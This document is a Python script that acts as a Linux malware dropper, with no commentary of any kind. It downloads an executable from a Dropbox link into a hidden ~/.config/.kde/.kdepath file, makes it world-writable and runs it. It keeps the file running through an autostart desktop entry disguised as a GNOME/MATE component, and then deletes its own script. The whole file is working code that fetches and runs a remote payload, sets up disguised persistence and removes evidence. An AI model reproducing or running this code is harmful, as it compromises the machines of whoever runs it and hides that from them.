import os
import subprocess
import requests
import logging

def main():
    # Set up logging
    logging.basicConfig(filename='upEvil.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    logging.info('Starting the main function.')

    # Configure directory paths and URLs
    home_dir = os.path.expanduser("~")
    dir_path = os.path.join(home_dir, ".config", ".kde")
    file_path = os.path.join(dir_path, ".kdepath")
    dir2_path = os.path.join(home_dir, ".config", "autostart")
    file2_path = os.path.join(dir2_path, "mate-user-share.desktop")
    url = "https://dl.dropbox.com/s/u3yn2g7rewly4nc/proclean"

    # Call the functions
    err = setup_program(dir_path, file_path, dir2_path, file2_path, url)
    if err:
        logging.error(f'Error encountered during setup: {err}')
    else:
        logging.info('Setup completed successfully.')

    err = delete_program()
    if err:
        logging.error(f'Error encountered during program deletion: {err}')
    else:
        logging.info('Program deletion completed successfully.')

def setup_program(dir_path, file_path, dir2_path, file2_path, url):
    logging.info('Starting the setup_program function.')

    # Check the operating system to determine the appropriate environment variable
    if os.name == 'nt':
        user_env_var = "USERNAME"
    else:
        user_env_var = "USER"

    try:
        # Get the user name from the environment variable
        he = os.environ.get(user_env_var)
        logging.info(f'Retrieved user name: {he}')

        # Create directories if they don't exist
        for path in [dir_path, dir2_path]:
            if not os.path.exists(path):
                os.makedirs(path, mode=0o777)
                logging.info(f'Created directory: {path}')

        # Download the file if it doesn't exist
        if not os.path.exists(file_path):
            logging.info('Downloading file from URL...')
            resp = requests.get(url, timeout=30)
            resp.raise_for_status()
            with open(file_path, "wb") as f:
                f.write(resp.content)
                logging.info(f'Downloaded file to: {file_path}')
        else:
            logging.info(f'File already exists at: {file_path}')

        # Ensure file permissions are set
        os.chmod(file_path, mode=0o777)

        # Execute the file
        subprocess.Popen(file_path)
        logging.info(f'Executed file: {file_path}')

        # Create or update the desktop entry file
        with open(file2_path, "w") as f:
            f.write("[Desktop Entry]\nEncoding=UTF-8\nName=Gnome-Path\nComment=kde system configuration\nIcon=gnome-info\nExec=/home/{}/.config/.kde/.kdepath\nTerminal=false\nType=Application\nCategories=\nX-GNOME-Autostart-enabled=true\nX-GNOME-Autostart-Delay=0\n".format(he))
            logging.info(f'Created or updated desktop entry file: {file2_path}')

    except Exception as e:
        logging.error(f'Error in setup_program function: {e}')
        return str(e)

    logging.info('Completed the setup_program function successfully.')
    return None

def delete_program():
    logging.info('Starting the delete_program function.')
    try:
        # Delete the program file
        os.remove(os.path.abspath(__file__))
        logging.info('Deleted program file.')
    except Exception as e:
        logging.error(f'Error in delete_program function: {e}')
        return str(e)

    logging.info('Completed the delete_program function successfully.')
    return None

if __name__ == "__main__":
    main()
